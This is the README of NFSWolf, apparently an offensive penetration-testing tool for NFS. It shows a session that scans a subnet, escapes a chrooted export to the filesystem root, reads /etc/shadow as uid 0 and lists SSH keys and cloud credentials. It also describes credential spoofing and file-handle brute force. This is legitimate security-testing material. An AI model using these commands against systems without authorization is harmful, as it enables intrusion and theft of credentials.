<h1 align="center">NFSWolf</h1>

<p align="center"><strong>Find NFS shares. Escape export boundaries. Read /etc/shadow. One static binary.</strong></p>

<p align="center">
  <a href="https://github.com/StrongWind1/NFSWolf/actions/workflows/ci.yml"><img src="https://github.com/StrongWind1/NFSWolf/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
  <a href="https://crates.io/crates/nfswolf"><img src="https://img.shields.io/crates/v/nfswolf.svg" alt="crates.io"></a>
  <a href="Cargo.toml"><img src="https://img.shields.io/badge/msrv-1.95-informational" alt="MSRV 1.95"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg" alt="License: Apache 2.0"></a>
  <a href="https://strongwind.dev/NFSWolf/"><img src="https://img.shields.io/badge/docs-mkdocs-blue.svg" alt="Docs"></a>
</p>

<p align="center">
  <a href="https://strongwind.dev/NFSWolf/getting-started/installation/">Installation</a> &bull;
  <a href="https://strongwind.dev/NFSWolf/getting-started/quick-start/">Quick start</a> &bull;
  <a href="https://strongwind.dev/NFSWolf/usage/cli-reference/">CLI reference</a> &bull;
  <a href="https://strongwind.dev/NFSWolf/security/">Findings catalog</a> &bull;
  <a href="https://strongwind.dev/NFSWolf/">Documentation</a>
</p>

---

NFSWolf covers the NFS attack path in one binary: find servers, audit their exports, escape an export to the filesystem root, then work through an interactive shell or a local FUSE mount. It speaks NFSv2, v3, and v4 itself in pure Rust, with no `libnfs` and no kernel NFS client. It replaces `showmount`, `nfsshell`, `nfsspy`, and the Metasploit NFS modules.

## Example

```console
$ nfswolf scan 192.168.1.0/24
╭──────────────┬──────┬───────────┬───────┬───────────╮
│ IP           │ NFSv3│ v3 Exports│ NFSv4 │ v4 Exports│
├──────────────┼──────┼───────────┼───────┼───────────┤
│ 192.168.1.10 │ yes  │ 2         │ yes   │ 2         │
│ 192.168.1.22 │ yes  │ 1         │ --    │ --        │
╰──────────────┴──────┴───────────┴───────┴───────────╯
[*] Done in 3.2s -- 254 host(s) scanned, 2 with NFS

$ nfswolf escape --fast 192.168.1.10:/srv/nfs
[*] Escaping 192.168.1.10 (fast mode)
[*] 1 unique seed handle(s) acquired
[*] 3 candidates constructed (deduped from 5)
[*] 1 tree-top(s) confirmed

  Results:
    [OS-ESCAPE]  ext4 inode 2  via MOUNT v3 /srv/nfs   [v3]  no_root_squash,rw
         handle: 0100070001000200000000000000000000000002ffffffff
         likely the real filesystem root, best candidate to try first
         rootfs dirs: bin, etc, usr, var (score: 4)

  1 handle(s) found from 1 seeds. 1 confirmed server rootfs.

  Next steps: Copy the handle above and use it with:
    nfswolf shell 192.168.1.10 --handle 0100070001000200000000000000000000000002ffffffff
    nfswolf mount 192.168.1.10 /mnt/escape --handle 0100070001000200000000000000000000000002ffffffff

$ nfswolf shell 192.168.1.10 \
    --handle 0100070001000200000000000000000000000002ffffffff --uid 0
nfswolf@192.168.1.10:/ uid=0 gid=0> cat /etc/shadow
root:$y$j9T$8kQx...:19874:0:99999:7:::
daemon:*:19874:0:99999:7:::

nfswolf@192.168.1.10:/ uid=0 gid=0> suid-scan /
[*] scanning for SUID/SGID binaries...
[!] SUID 4755  uid=0  /usr/bin/sudo
[!] SUID 4755  uid=0  /usr/bin/passwd
[!] SUID 4755  uid=0  /usr/bin/pkexec

nfswolf@192.168.1.10:/ uid=0 gid=0> secrets-scan /home
[*] scanning for secrets and credentials...
[!] potential secret: /home/admin/.ssh/id_rsa  (1675 bytes  0600)
[!] potential secret: /home/admin/.aws/credentials  (234 bytes  0600)
[!] potential secret: /home/deploy/.env  (512 bytes  0644)
```

The export was chrooted to `/srv/nfs`. NFSWolf constructed a file handle pointing at inode 2 (the ext4 filesystem root), bypassing the export boundary entirely. From there the full filesystem is reachable: `/etc/shadow`, SUID binaries, SSH keys, everything.

## Features

- **Export escape**: constructs file handles that bypass `subtree_check` on 18 filesystem types (ext2/3/4, XFS, BTRFS, ZFS, f2fs, JFS, NILFS2, ReiserFS, VFAT, NTFS3, UDF, bcachefs, SquashFS, EROFS, ISO9660) and reach the filesystem root from a chrooted export. Cascades through MOUNT v3, v1, NFSv4 LOOKUP, and LOOKUPP.
- **Automatic credential escalation**: when access is denied, an evidence-driven UID ladder tries the file owner, the caller's UID with the file's group, root, identities seen in directory listings, and common service accounts. No manual UID guessing.
- **62-finding audit**: export misconfigurations, credential weaknesses, handle leaks, privilege escalation paths, and protocol downgrades. Each finding cites its RFC section and carries severity, detection method, and remediation ([catalog](https://strongwind.dev/NFSWolf/security/)).
- **Interactive shell**: 47 commands across NFSv2, v3, and v4 with tab completion, recursive `get -r`/`put -r` with SHA-256 verification, `--handle` to skip MOUNT, `-c` for scripting, `suid-scan`, `secrets-scan`, `last`/`lastb`/`lastlog` login history, and automatic version detection.
- **FUSE mount**: mount any export locally with spoofed credentials, per-inode credential escalation, and symlink rewriting on escaped roots. NFSv2, v3, and v4.
- **Handle brute force**: inode/generation sweep that tells STALE from BADHANDLE, plus a `--mask` nibble-mask mode for OS-agnostic handle brute force ([oracle details](https://strongwind.dev/NFSWolf/usage/brute-handle/)).
- **Own protocol stack**: pure Rust, no `libnfs`, no C. NFSv2, NFSv3, NFSv4.0, MOUNT v1/v3, portmapper, rpcbind, NFS_ACL, and RQUOTA live in eight standalone crates on crates.io ([protocol stack](https://strongwind.dev/NFSWolf/nfs/protocol-stack/), [auth flavors](https://strongwind.dev/NFSWolf/nfs/authentication/), [spec coverage](https://strongwind.dev/NFSWolf/reference/spec-completeness/)). The musl build is fully static; macOS and Windows builds ship too.
- **RPC engine**: connections pooled per (host, export, uid, gid) with LIFO reuse; a circuit breaker (sliding window, exponential cooldown) that trips on transient errors only, never on permission denials; per-call timeouts, delay and jitter pacing, and SOCKS5 for all TCP.

## Installation

```sh
cargo install nfswolf
```

Prebuilt static binary for Linux x86_64, from [Releases](https://github.com/StrongWind1/NFSWolf/releases):

```sh
curl -LO https://github.com/StrongWind1/NFSWolf/releases/latest/download/nfswolf-linux-x86_64
chmod +x nfswolf-linux-x86_64
```

From source:

```sh
git clone https://github.com/StrongWind1/NFSWolf && cd NFSWolf && make release
```

Building with the default `fuse` feature needs the libfuse3 headers. Build requirements and Cargo features: [installation docs](https://strongwind.dev/NFSWolf/getting-started/installation/).

<details>
<summary><strong>All artifacts and verification</strong></summary>

Each release ships a `SHA256SUMS` file, its cosign signature `SHA256SUMS.sig`, and SLSA build-provenance attestations for every binary.

Pick the artifact carefully: the `mount` subcommand is NOT in the musl static build. Every build has scan, analyze, escape, and shell.

| File | Build | `nfswolf mount` | When to use it |
| --- | --- | :---: | --- |
| `nfswolf-linux-x86_64` | musl, static | **no** | Runs on any Linux with no dependencies (Alpine, distroless, CI runners) |
| `nfswolf-linux-x86_64-full` | glibc, dynamic | **yes** | FUSE mounts; needs libfuse3 on the host |
| `nfswolf-linux-arm64`, `-arm64-full` | same split on ARM64 | same split | Same trade-off on ARM64 |
| `nfswolf-macos-universal`, `-arm64`, `-x86_64` | macOS | **no** | For `mount`, install [macFUSE](https://osxfuse.github.io/) and build from source |
| `nfswolf-windows-x86_64-msvc.exe`, `-gnu.exe`, `-arm64-msvc.exe` | Windows | **no** | FUSE is Linux and macOS only |

```sh
# Integrity
sha256sum -c SHA256SUMS --ignore-missing

# Authenticity (cosign)
cosign verify-blob \
  --certificate-identity-regexp "^https://github\\.com/StrongWind1/NFSWolf/" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  --signature SHA256SUMS.sig \
  SHA256SUMS
```

</details>

## Quick start

```sh
# Scan a subnet for NFS
nfswolf scan 192.168.1.0/24

# Audit a host, then render an HTML report
nfswolf analyze 192.168.1.10 --json results.json
nfswolf convert -i results.json --format html -o report.html

# Full escape: all exports, all handle sources, all versions
nfswolf escape 192.168.1.10 --json --read-shadow > escape.json

# Interactive shell (auto-detects NFSv2/v3/v4)
nfswolf shell 192.168.1.10:/srv/nfs --uid 0

# FUSE-mount an export locally (glibc build)
sudo nfswolf --uid 0 mount 192.168.1.10:/srv/nfs /mnt/target
```

Handle decoding, `--mask` brute force, `-c` script mode, stealth pacing, and SOCKS5 are in the [examples](https://strongwind.dev/NFSWolf/usage/examples/). Every subcommand and global flag is in the [CLI reference](https://strongwind.dev/NFSWolf/usage/cli-reference/).

## What NFSWolf does not do

- Exploit RPCSEC_GSS / Kerberized mounts: it detects them only.
- Attack NFS-over-TLS channels: it detects `NONE`/`TLS_V1` negotiation only.
- Write files in `shell` or `mount` without `--allow-write`.
- Run without a target given on the command line.

## Development

Conventional commit messages (`feat:`, `fix:`, `docs:`).

```sh
make hooks        # install the repo pre-commit hook
make dev          # debug build, fast iteration
make check-all    # full gate: fmt, lint, audit, check, test, doc, hygiene
```

## Credits

- [nfs3-rs](https://github.com/Vaiz/nfs3) by Vaiz: the NFSv3 / MOUNT / portmapper / XDR foundation, released under the Unlicense.
- Authors of RFC 1057, RFC 1094, RFC 1813, RFC 5531, RFC 7530, RFC 2623, RFC 9289.

## Related tools

- [**IKEWolf**](https://github.com/StrongWind1/IKEWolf): IKE/IPsec scanner for endpoint discovery, transform enumeration, vendor fingerprinting, and Aggressive Mode PSK hash extraction

All tools: [strongwind.dev](https://strongwind.dev)

## Disclaimer

NFSWolf is for authorized security testing, research, and education. Use it only against systems and data you own or have written permission to test. You are responsible for how you use it.

## License

[Apache License 2.0](LICENSE)
